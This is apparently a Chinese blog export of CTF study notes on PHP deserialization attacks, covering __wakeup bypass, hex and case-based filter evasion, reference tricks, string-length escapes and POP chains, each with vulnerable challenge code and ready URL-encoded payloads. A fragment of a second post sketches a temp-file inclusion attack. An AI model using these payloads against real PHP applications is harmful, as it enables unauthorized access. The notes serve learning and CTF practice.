<h3 id="php反序列化：unserialize"><a href="#php反序列化：unserialize" class="headerlink" title="php反序列化：unserialize()"></a>php反序列化：<code>unserialize()</code></h3><p>反序列化是将字符串转换成变量或对象的过程</p>
<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化.</p>
<h4 id="实列及详解-1"><a href="#实列及详解-1" class="headerlink" title="实列及详解"></a>实列及详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people</span><br><span class="line">&#123;</span><br><span class="line"> public $name = &quot;f1r3K0&quot;;</span><br><span class="line"> public $age = &#x27;18&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$class =  new people();</span><br><span class="line">$class_ser = serialize($class);</span><br><span class="line">print_r($class_ser);</span><br><span class="line">$class_unser = unserialize($class_ser);</span><br><span class="line">print_r($class_unser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;people&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;f1r3K0&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">people Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; f1r3K0</span><br><span class="line">    [age] =&gt; 18</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注意当使用 <code>unserialize()</code> 恢复对象时， 将调用 <code>__wakeup()</code> 成员函数</strong></p>
<h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct //当一个对象创建时被调用，即在程序的开头被调用</span><br><span class="line">__destruct //当一个对象销毁时被调用，即在程序的结尾被调用</span><br><span class="line">__toString //当一个对象被当作一个字符串被调用</span><br><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //对不存在的方法或者不可访问的方法进行调用就自动调用</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>魔术方法指的是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
<p>重点关注以下几个：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</span><br><span class="line">__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。</span><br><span class="line">__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</span><br><span class="line">__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</span><br></pre></td></tr></table></figure>

<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h5><p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<p><strong>实列及详解</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &#x27;class.php&#x27;;  </span><br><span class="line">$select = $_GET[&#x27;select&#x27;];  </span><br><span class="line">$res=unserialize(@$select); //将@放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</span><br><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">include &#x27;flag.php&#x27;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;  </span><br><span class="line"> private $username = &#x27;nonono&#x27;;  </span><br><span class="line"> private $password = &#x27;yesyes&#x27;;  </span><br><span class="line"></span><br><span class="line"> public function __construct($username,$password)&#123;  </span><br><span class="line"> $this-&gt;username = $username;  </span><br><span class="line"> $this-&gt;password = $password;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __wakeup()&#123;  </span><br><span class="line"> $this-&gt;username = &#x27;guest&#x27;;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> function __destruct()&#123;  </span><br><span class="line"> if ($this-&gt;password != 100) &#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You name is: &quot;;  </span><br><span class="line"> echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> echo &quot;You password is: &quot;;  </span><br><span class="line"> echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"> &#125;  </span><br><span class="line"> if ($this-&gt;username === &#x27;admin&#x27;) &#123;  </span><br><span class="line"> global $flag;  </span><br><span class="line"> echo $flag;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line"> echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;  </span><br><span class="line"> die();  </span><br><span class="line"></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看源码我们需要<code>password=100，username=admin</code>。如果单纯输入<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</code>反序列化过程中<code>__wakeup</code>方法里会把username赋值为guest。此时我们要修改类数使其大于2，就可以绕过<code>__wakeup</code>方法。注意是用<code>GET</code>方式，但是别忘了要Url编码。</p>
<p>如何偷懒得到序列化格式？直接在源码后面编个脚本就行啦！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);  </span><br><span class="line">echo serialize($a);  </span><br><span class="line">echo urlencode(serialize($a));  </span><br></pre></td></tr></table></figure>
<p>最终输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Url/?select = O%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<h5 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;S:4:&quot;%00*%00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="实例及详解"><a href="#实例及详解" class="headerlink" title="实例及详解"></a>实例及详解</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码可知：username被ban了。</p>
<p>原代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>转换后为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>75是u的16进制编码。</p>
<h5 id="php类名大小写绕过"><a href="#php类名大小写绕过" class="headerlink" title="php类名大小写绕过"></a>php类名大小写绕过</h5><p>php类名对大小写不敏感，而且过滤并没有过滤大小写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;  </span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是触发析构函数就得到了flag，但是有过滤，如果匹配到了ctfshow就抛异常。所以可以构造CTFSHOW来绕过。</p>
<h5 id="号绕过"><a href="#号绕过" class="headerlink" title="+号绕过"></a>+号绕过</h5><h5 id="利用-使两值恒等"><a href="#利用-使两值恒等" class="headerlink" title="利用&amp;使两值恒等"></a>利用&amp;使两值恒等</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);  </span><br><span class="line">include(&#x27;flag.php&#x27;);  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">class ctfshowAdmin&#123;  </span><br><span class="line">public $token;  </span><br><span class="line">public $password;  </span><br><span class="line"></span><br><span class="line">public function __construct($t,$p)&#123;  </span><br><span class="line">$this-&gt;token=$t;  </span><br><span class="line">$this-&gt;password = $p;  </span><br><span class="line">&#125;  </span><br><span class="line">public function login()&#123;  </span><br><span class="line">return $this-&gt;token===$this-&gt;password;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);  </span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());  </span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;  </span><br><span class="line">echo $flag;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$ctfshow-&gt;login()</code>这个成立才给<code>flag</code>，<code>$ctfshow-&gt;token=md5(mt_rand())</code>但是是随机的</p>
<p>知识点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;  </span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;  </span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//$b被赋值的是变量a的地址，php是按地址传参，a的值会随b值变化  </span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>故可以用如下脚本达成目的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line"> <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();  </span><br><span class="line"><span class="keyword">echo</span> ( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<h4 id="反序列化逃逸问题"><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h4><p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p>
<p>所以会有两种情况，一种是由长变短,一种是由短变长</p>
<h5 id="由短变长"><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$age = &quot;I am 11&quot;;</span><br><span class="line">$arr = array($name,$age);</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;</span><br></pre></td></tr></table></figure>

<p>正常传入<code>name = mao</code>，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(38) &quot;a:2:&#123;i:0;s:3:&quot;mao&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;I am 11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=I am 11</span><br></pre></td></tr></table></figure>

<p>当传入<code>name = maox</code>时，就会出错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(39) &quot;a:2:&#123;i:0;s:4:&quot;maox&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:bool(false)</span><br><span class="line">&lt;br/&gt;此时，age=</span><br></pre></td></tr></table></figure>

<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>时，反而有输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(79) &quot;a:2:&#123;i:0;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>

<p>这是为什么？</p>
<p>在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾。</p>
<p><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程。</p>
<h5 id="由长变短"><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure>

<p>正常情况传入<code>name=mao&amp;age=11</code>，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;mao&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(2) &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=11</span><br></pre></td></tr></table></figure>

<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;</code>时，输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化字符串：string(46) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;过滤后:string(94) &quot;a:2:&#123;s:4:&quot;name&quot;;s:43:&quot;maoxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;;&#125;&quot;</span><br><span class="line">&lt;br/&gt;array(2) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(43) &quot;maoxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  string(6) &quot;woaini&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br/&gt;此时，age=woaini</span><br></pre></td></tr></table></figure>

<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了。</p>
<h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h4><p> 前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
<p><strong>实列及讲解</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>首先观察一下整段代码，<code>w44m</code>类里面的<code>Getflag</code>函数可以用来读取flag，因此就将它作为这条链子的尾部。</p>
<p>再想一下如何去调用这个函数，<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</code>会调用函数，所以只需要给<code>$w00m</code>赋一个<code>w44m</code>类，然后再给<code>w22m</code>赋一个<code>Getflag</code>就能成功调用该函数。</p>
<p>还差谁？<code>w33m</code>。再考虑一下如何调用这个<code>w33m</code>类呢？<code>__toString()</code>方法会在一个对象被当作字符串时被调用，于是我们就能看到下面<code>w22m</code>这个类里面的<code>echo</code>函数。我们只要给<code>w00m</code>赋一个<code>w33m</code>类，就能调用。</p>
<p>构造exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin=&#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd=&#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m;</span><br><span class="line">$a-&gt;w00m=new w33m;</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br><span class="line">$a-&gt;w00m-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p>最终WP：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>包含临时文件学习记录</title>
    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
<span id="more"></span>

<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
